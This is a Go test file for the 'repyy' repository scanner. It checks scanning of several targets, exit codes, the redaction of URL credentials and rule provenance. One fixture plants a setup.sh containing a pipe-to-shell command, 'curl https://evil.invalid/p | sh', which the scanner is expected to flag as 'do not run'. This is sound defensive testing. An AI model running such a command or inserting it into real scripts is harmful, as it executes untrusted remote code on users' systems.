package app

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

func TestMultipleTargetsAndFlagsAfterTargets(t *testing.T) {
	clean, risky := t.TempDir(), t.TempDir()
	if err := os.WriteFile(filepath.Join(clean, "main.go"), []byte("package main\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"README.md", "LICENSE"} {
		if err := os.WriteFile(filepath.Join(clean, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(risky, "setup.sh"), []byte("curl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", clean, risky, "--format", "json", "--jobs", "2"}, &stdout, &stderr, "test")
	if err != nil {
		t.Fatal(err)
	}
	if code != 1 {
		t.Fatalf("exit = %d, want 1; output=%s", code, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 {
		t.Fatalf("got %d results", len(report.Results))
	}
	if report.Results[0].Verdict != model.VerdictNoFindings {
		t.Fatalf("clean verdict: %s", report.Results[0].Verdict)
	}
	if report.Results[1].Verdict != model.VerdictDoNotRun {
		t.Fatalf("risky verdict: %s", report.Results[1].Verdict)
	}
}

func TestOperationalFailureWinsExitCode(t *testing.T) {
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", "/path/that/does/not/exist", "--format=json"}, &stdout, &stderr, "test")
	if err != nil {
		t.Fatal(err)
	}
	if code != 2 {
		t.Fatalf("exit = %d, want 2", code)
	}
}

func TestDisplayTargetRedactsURLCredentials(t *testing.T) {
	got := displayTarget("https://user:secret@example.com/repo.git")
	if got != "https://[REDACTED]@example.com/repo.git" {
		t.Fatalf("got %q", got)
	}
}

func TestRulesListJSONIncludesProvenance(t *testing.T) {
	var stdout bytes.Buffer
	code, err := Run([]string{"rules", "list", "--format", "json"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 0 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	var result struct {
		Packages []struct {
			Source      string   `json:"source"`
			SourceURL   string   `json:"source_url"`
			Description string   `json:"description"`
			Affected    []string `json:"affected_versions"`
		} `json:"packages"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatal(err)
	}
	if len(result.Packages) == 0 || result.Packages[0].Source == "" || result.Packages[0].SourceURL == "" || result.Packages[0].Description == "" {
		t.Fatalf("missing provenance: %#v", result.Packages)
	}
}
